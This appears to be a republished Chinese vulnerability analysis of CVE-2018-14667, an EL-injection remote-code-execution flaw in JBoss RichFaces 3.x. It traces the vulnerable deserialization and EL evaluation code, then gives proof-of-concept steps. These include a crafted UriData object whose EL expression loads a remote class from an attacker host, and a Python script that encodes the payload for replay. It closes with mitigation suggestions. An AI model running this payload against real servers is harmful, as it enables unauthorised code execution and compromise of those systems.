@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>JBoss RichFaces EL Injection RCE Analysis(CVE-2018-14667)</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>JBoss RichFaces EL Injection RCE Analysis(CVE-2018-14667)</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NDM1OTM0Mg==&amp;mid=2651051159&amp;idx=1&amp;sn=d6aa274b18185af04bf30247d9d5100b&amp;chksm=bd7f85d68a080cc0cd2f5eec67b9d46a34ea4f354ae74adbb8e7b44115cf44966448a0207543&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NDM1OTM0Mg==&amp;mid=2651051159&amp;idx=1&amp;sn=d6aa274b18185af04bf30247d9d5100b&amp;chksm=bd7f85d68a080cc0cd2f5eec67b9d46a34ea4f354ae74adbb8e7b44115cf44966448a0207543&amp;scene=27#wechat_redirect</a></blockquote><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5555555555555556" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8iaQksweqAL7rkEeCoeYTzgIA1TibLfA89mVAU4oOBe4JXFpEyKmZxOOEVz3IiaxAicl0T2aBSOqw6MtA/640?wx_fmt=png" data-type="png" data-w="900" style="" src="../Images/24aa1601dcfc26bbf9910186241c7ac7.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8iaQksweqAL7rkEeCoeYTzgIA1TibLfA89mVAU4oOBe4JXFpEyKmZxOOEVz3IiaxAicl0T2aBSOqw6MtA/640?wx_fmt=png"/></p><h4 style="text-align: center;"><em><strong><span style="font-size: 15px;">作者: Cryin</span></strong></em><br/></h4><h4 style="-webkit-print-color-adjust: exact;margin-top: 20px;margin-bottom: 10px;font-weight: bold;-webkit-font-smoothing: antialiased;cursor: text;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">介绍</h4><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">根据Red Hat官方给出的公告信息，Java RichFaces框架中包含一个RCE漏洞,恶意攻击者构造包含org.ajax4jsf.resource.UserResource$UriData序列化对象的特定UserResource请求，RichFaces会先反序列化该UriData对象，然后使用EL表达式解析并获取resource的modified、expires等值导致了任意EL表达式执行，通过构造特殊的EL表达式可实现远程任意代码执行。</p><ul style="" class=" list-paddingleft-2"><li><p>关于RichFaces</p></li></ul><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">JavaServer Faces（JSF）是一个用于为Web应用程序构建用户界面的框架。 虽然只有两个主要的JSF实现（Apache MyFaces和Oracle Mojarra），但有几个组件库，它们提供了额外的UI组件和功能。 RichFaces是这些组件库中最受欢迎的库之一，因为它是JBoss出品且也是JBoss EAP等产品的一部分。 RichFaces已经于2016年停止开发，最新的版本分支为3.3.4、4.5.17</p><ul style="" class=" list-paddingleft-2"><li><p style="-webkit-print-color-adjust: exact;margin-bottom: 15px;line-height: normal;"><span style="font-size: 14px;">受影响Richfaces版本：</span></p></li><ul style="list-style-type: square;" class=" list-paddingleft-2"><li><p style="line-height: normal;"><span style="font-size: 14px;">JBoss Richfaces 3.1.x - 3.3.4</span></p></li></ul><li><p style="-webkit-print-color-adjust: exact;margin-bottom: 15px;line-height: normal;"><span style="font-size: 14px;">受影响产品</span></p></li><ul style="list-style-type: square;" class=" list-paddingleft-2"><li><p style="line-height: normal;"><span style="font-size: 14px;">Enterprise Application Platform 5.2</span></p></li><li><p style="line-height: normal;"><span style="font-size: 14px;">Red Hat JBoss BRMS 5.3.1</span></p></li><li><p style="line-height: normal;"><span style="font-size: 14px;">Red Hat JBoss SOA Platform 5.3.1</span></p></li><li><p style="line-height: normal;"><span style="font-size: 14px;">Red Hat Developer Studio 12.9</span></p></li></ul></ul><h4 style="-webkit-print-color-adjust: exact;margin-top: 20px;margin-bottom: 10px;font-weight: bold;-webkit-font-smoothing: antialiased;cursor: text;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">漏洞分析</h4><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">RichFaces的Resource相关请求均由InternetResourceService的serviceResource来处理，根据请求中的数据动态生成图像、视频、声音等资源，在RichFaces 3.x中，资源数据请求被放在/DATA/或者/DATB/的请求路径下，其中/DATB/后面跟的是字节数组，/DATA/后面跟的是序列化后的对象，在serviceResource中调用的getResourceDataForKey函数可以看到:</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">public Object getResourceDataForKey(String key) {
+        Object data = null;
+        String dataString = null;
+    //private static final Pattern DATA_SEPARATOR_PATTERN = Pattern.compile("/DAT(A|B)/");
+        Matcher matcher = DATA_SEPARATOR_PATTERN.matcher(key);
+        if (matcher.find()) {
+            ....
+            try {
+                dataArray = dataString.getBytes("ISO-8859-1");
+                objectArray = decrypt(dataArray);
+            } catch (UnsupportedEncodingException e1) {
+                // default encoding always presented.
+            }
+            if ("B".equals(matcher.group(1))) {
+                data = objectArray;
+            } else {
+                try {
+                    ObjectInputStream in = new LookAheadObjectInputStream(new ByteArrayInputStream(objectArray));
+                    data = in.readObject();
+                  .....
+          .....
+
+        return data;
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">其中在函数LookAheadObjectInputStream中进行了反序列化操作，Richfaces重写了ObjectInputStream类的resolveClass方法来实现反序列化类白名单限制，在framework/impl/src/main/java/org/ajax4jsf/resource/LookAheadObjectInputStream.java中可以看到：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">/**
+* Only deserialize primitive or whitelisted classes
+*/
+ @Override
+protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+        Class&lt;?&gt; primitiveType = PRIMITIVE_TYPES.get(desc.getName());
+    if (primitiveType != null) {
+        return primitiveType;
+    }
+    if (!isClassValid(desc.getName())) {
+        throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
+    }
+    return super.resolveClass(desc);
+}
+boolean isClassValid(String requestedClassName) {
+        if (whitelistClassNameCache.containsKey(requestedClassName)) {
+            return true;
+        }
+        try {
+            Class&lt;?&gt; requestedClass = Class.forName(requestedClassName);
+            for (Class baseClass : whitelistBaseClasses ) {
+                if (baseClass.isAssignableFrom(requestedClass)) {
+                    whitelistClassNameCache.put(requestedClassName, Boolean.TRUE);
+                    return true;
+                }
+            }
+        } catch (ClassNotFoundException e) {
+            return false;
+        }
+        return false;
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">在isClassValid函数中调用了class.isAssignableFrom校验反序列化的类，就是说只要是对象的子类或者接口与白名单相同也是允许反序列化的。其中3.x版本中白名单包含了bool、int等java常用基本类型，同时还有：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">org.ajax4jsf.resource.InternetResource,
+org.ajax4jsf.resource.SerializableResource,
+javax.el.Expression,
+javax.faces.el.MethodBinding,
+javax.faces.component.StateHolderSaver,
+java.awt.Color</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">在4.x版本中又陆续增加了一些白名单类：History for serialization.properties - richfaces<span class="Apple-converted-space"> </span>对请求中的资源数据反序列化后，接着send给InternetResourceBase的sendHeaders函数处理：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">public void sendHeaders(ResourceContext context) {
+        boolean cached = context.isCacheEnabled() &amp;&amp; isCacheable(context);
+        if (log.isDebugEnabled()) {
+            log.debug(Messages.getMessage(Messages.SET_RESPONSE_HEADERS_INFO,
+                    getKey()));
+        }
+        // context.setHeader("Content-Type",getContentType());
+        context.setContentType(getContentType(context));
+        Date lastModified = getLastModified(context);
+        if (lastModified != null) {
+            context.setDateHeader("Last-Modified", lastModified.getTime());
+        }
+        int contentLength = getContentLength(context);
+        if (cached) {
+            if (contentLength &gt; 0) {
+                context.setContentLength(contentLength);
+            }
+            long expired = getExpired(context);
+            if (expired &lt; 0) {
+                expired = DEFAULT_EXPIRE;
+            }
+            context.setDateHeader("Expires", System.currentTimeMillis() + expired);
+            context.setHeader("Cache-control", "max-age=" + (expired / 1000L));
+        } else {
+            if (contentLength &gt; 0) {
+                context.setContentLength(contentLength);
+                // } else {
+                // context.setHeader("Transfer-Encoding", "chunked");
+            }
+            context.setHeader("Cache-control", "max-age=0, no-store, no-cache");
+            context.setHeader("Pragma", "no-cache");
+            context.setIntHeader("Expires", 0);
+        }
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">这里调用getLastModified及getExpired方法获取了Modified、expired等一些header，因为这里请求类型是UserResource，所以继续看UserResource类的getLastModified函数代码：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">public Date getLastModified(ResourceContext resourceContext) {
+        UriData data = (UriData) restoreData(resourceContext);
+        FacesContext facesContext = FacesContext.getCurrentInstance();
+        if (null != data &amp;&amp; null != facesContext ) {
+            // Send headers
+            ELContext elContext = facesContext.getELContext();
+            if(data.modified != null){
+            ValueExpression binding = (ValueExpression) UIComponentBase.restoreAttachedState(facesContext,data.modified);
+            Date modified = (Date) binding.getValue(elContext);
+            if (null != modified) {
+                return modified;
+            }
+        }
+        }
+        return super.getLastModified(resourceContext);
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">其中UriData的定义如下,这里UriData实现了SerializableResource接口，所以等于UriData也是在反序列化类白名单里的:</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">public static class UriData implements SerializableResource {
+
+        private static final long serialVersionUID = 1258987L;
+        
+        private Object value;
+        
+        private Object createContent;
+        
+        private Object expires;
+        
+        private Object modified;
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">这里将对象转换为UriData类型并将data.modified作为el表达式传入ValueExpression.getValue从而造成任意EL表达式执行漏洞。</p><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">以RichFaces官方的richfaces-demo (3.3.3 Final)进行调试，下载war包并启动tomcat，在Ajax Output-&gt;Media Outpput菜单可触发UserResource请求，随便使用数字替换请求中的资源数据请求：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-none" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">http://127.0.0.1:8080/richfaces-3.3.3.Final/a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/123.jsf</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">response：<span class="Apple-converted-space"> </span><img class="" data-ratio="0.5282186948853616" data-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8iaQksweqAL7rkEeCoeYTzgIpGZFPbO5gryXCl0dvW6hoTc2iclm47qSF6HyUia3SooOKqUxcwELD9aA/640?wx_fmt=png" data-type="png" data-w="1134" style="-webkit-print-color-adjust: exact;" src="../Images/203243e5e7538f681e8325b417b4ad7b.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8iaQksweqAL7rkEeCoeYTzgIpGZFPbO5gryXCl0dvW6hoTc2iclm47qSF6HyUia3SooOKqUxcwELD9aA/640?wx_fmt=png"/>查看ResourceBuilderImpl.decrypt函数可知richfaces对资源数据先进行了base64解码，然后使用DEFLATE解压缩</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">protected byte[] decrypt(byte[] src) {
+        try {
+      //decode 方法调用：URL64Codec.decodeBase64，并且替换了+等几个特殊字符
+            byte[] zipsrc = codec.decode(src);
+            Inflater decompressor = new Inflater();
+            byte[] uncompressed = new byte[zipsrc.length * 5];
+            decompressor.setInput(zipsrc);
+            int totalOut = decompressor.inflate(uncompressed);
+            byte[] out = new byte[totalOut];
+            System.arraycopy(uncompressed, 0, out, 0, totalOut);
+            decompressor.end();
+            return out;
+        } catch (Exception e) {
+            throw new FacesException("Error decode resource data", e);
+        }
+    }</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">所以利用该漏洞需要先构造包含EL表达式的UriData序列化对象，然后再将数据DEFLATE压缩，最后再进行base64编码。</p><h4 style="-webkit-print-color-adjust: exact;margin-top: 20px;margin-bottom: 10px;font-weight: bold;-webkit-font-smoothing: antialiased;cursor: text;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">POC构造</h4><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">POC构造可参考tint0的文章When EL Injection meets Java Deserialization给出的利用方式进行构造，构造特殊的UriData对象，因为首先处理的是modified值，所以这里将modified的值设置为 javax.faces.component.StateHolderSaver对象，而该对象的savedState字段为ValueExpressionImpl对象，ValueExpressionImpl 对象的 expr 字段为注入的el表达式，形如：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-txt" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">Ljava.lang.Object[UriData]
+ [0] = (value) null
+ [1] = (createContent) null
+ [2] = (expires) null
+ [3] = (modified) javax.faces.component.StateHolderSaver
+   savedState = (org.apache.el.ValueExpressionImpl)
+     expr = (java.lang.String) "${a="".getClass().forName("javax.management.loading.MLet").newInstance();a.addURL("http://192.168.1.5:8314/exploit");a.loadClass("exploit",null)}"
+     node = (Node) null
+     FunctionMapper = (FunctionMapper) null
+     VariableMapper = (VariableMapper) null
+     expectedType = (expectedType) null</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">这里StateHolderSaver构造函数第一个参数为FacesContext是抽象类，无法实例化，所以无法通过反射调用构造函数创建javax.faces.component.StateHolderSaver对象，这里可以使用Objenesis不使用构造函数创建对象：</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-java" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">Class cls = Class.forName("javax.faces.component.StateHolderSaver");
+Objenesis objenesis = new ObjenesisStd(true);
+Object myObj = objenesis.newInstance(cls);</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">创建好序列化对象后使用下面脚本进行编码</p><pre style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);font-size: 13px;line-height: 19px;overflow: auto;padding: 6px 10px;border-radius: 3px;"><code class="language-python" style="-webkit-print-color-adjust: exact;border-width: initial;border-style: none;border-color: initial;background-color: transparent;border-radius: 3px;">import base64
+import zlib
+import binascii 
+
+def main():
+    filename='payload'
+    f = open(filename, "rb")
+    class_data=f.read()
+    hexstr = binascii.b2a_hex(class_data)
+  data=zlib.compress(class_data)
+  data=base64.b64encode(data).replace("+","-").replace("/","!").replace("=","_")
+    print "compress:" +data
+if __name__ == '__main__':
+    main()</code></pre><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">将compress好的数据附在UserResource请求的/DATA/后面重放请求即可触发漏洞。</p><h4 style="-webkit-print-color-adjust: exact;margin-top: 20px;margin-bottom: 10px;font-weight: bold;-webkit-font-smoothing: antialiased;cursor: text;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">总结</h4><p style="-webkit-print-color-adjust: exact;margin-top: 15px;margin-bottom: 15px;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;font-size: 14px;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">这个漏洞算是java反序列化与EL表达式注入合体的一个比较有意思漏洞，漏洞原理及利用思路和CVE-2015-0279也基本相似。RichFaces已经停止开发，官方对受影响的产品出了补丁，给出的修复建议是 在RichFaces中禁用EL表达式或者在反序列化白名单中限制一些类反序列化，但显然这个漏洞反序列化类也是不好限制的，如果将SerializableResource从白名单中去除可能会影响系统其它地方反序列化的正常运行。要从代码层面修复漏洞只能自己编写修复个人感觉比较快速的止血方法是对资源数据加解密的方法decrypt进行修改，当然也可以对URL中包含ajax4jsf.resource.UserResource的请求进行拦截已防止漏洞攻击。</p><h4 style="-webkit-print-color-adjust: exact;margin-top: 20px;margin-bottom: 10px;font-weight: bold;-webkit-font-smoothing: antialiased;cursor: text;caret-color: rgb(0, 0, 0);font-family: Helvetica, arial, sans-serif;white-space: normal;text-size-adjust: auto;background-color: rgb(255, 255, 255);">参考</h4><p style="text-align: left;"><span style="font-size: 14px;">* [CVE-2018-14667 - RichFaces remote code execution - Red Hat Customer Portal](https://access.redhat.com/solutions/3660371)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [Red Hat JBoss EAP RichFaces Access Control Bug Lets Remote Users Execute Arbitrary Code on the Target System - SecurityTracker](https://securitytracker.com/id/1042037)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [Java Reflection - Constructors](http://tutorials.jenkov.com/java-reflection/constructors.html)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [Objenesis : Twenty Second Tutorial](http://objenesis.org/tutorial.html)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [[RF-13977] Remote Command Injection (EL Injection) - JBoss Issue Tracker](https://issues.jboss.org/browse/RF-13977)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [Remote Code with Expression Language Injection | Dan Amodio](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)</span></p><p style="text-align: left;"><span style="font-size: 14px;">* [code white | Blog: Poor RichFaces](https://codewhitesec.blogspot.com/2018/05/poor-richfaces.html)</span></p><p style="text-align: center;"><span style="font-size: 14px;"><img data-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8gMagaicDwBtLHQbDnGLpsAgC62c0eqNVHDj06aQBniaNlLdqpgPny6y0c7AZJeWgpIEsuDN4nHMt6w/640?wx_fmt=png" data-type="png" class="" data-ratio="1" data-w="600" style="width: 383px;height: 383px;" src="../Images/92379fb33f1f9ad098f3db3806537de9.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/6sTIpL7YN8gMagaicDwBtLHQbDnGLpsAgC62c0eqNVHDj06aQBniaNlLdqpgPny6y0c7AZJeWgpIEsuDN4nHMt6w/640?wx_fmt=png"/></span></p>
+        
+</body>
+</html>
